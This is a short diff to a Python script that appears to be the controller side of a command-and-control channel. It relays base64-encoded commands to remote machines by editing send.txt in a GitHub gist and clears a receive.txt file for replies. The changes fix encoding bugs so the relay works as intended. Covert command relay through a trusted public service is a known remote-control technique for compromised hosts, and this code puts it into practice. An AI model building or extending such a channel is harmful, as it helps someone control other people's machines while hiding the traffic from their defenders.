@@ -15,7 +15,7 @@ def clear_receive_file():
                 'Authorization': f'Bearer {GITHUB_API_KEY}',
                 "X-GitHub-Api-Version" : "2022-11-28"}
     payload = {
-        'files' : {"receive.txt" : {"content" : "@"}}
+        'files' : {"receive.txt" : {"content" : "QA=="}}
     }
     response = requests.patch(f'https://api.github.com/gists/{GIST_ID}', headers=headers, data=json.dumps(payload))
     
@@ -28,7 +28,7 @@ def send_command(command):
                 'Authorization': f'Bearer {GITHUB_API_KEY}',
                 "X-GitHub-Api-Version" : "2022-11-28"}
     send_payload = {
-        'files' : {"send.txt" : {"content" : base64.b64encode(command.encode("utf-8")) }}
+        'files' : {"send.txt" : {"content" : base64.b64encode(command.encode("utf-8")).decode('utf-8') }}
     }
     response = requests.patch(f'https://api.github.com/gists/{GIST_ID}', headers=headers, data=json.dumps(send_payload))
     
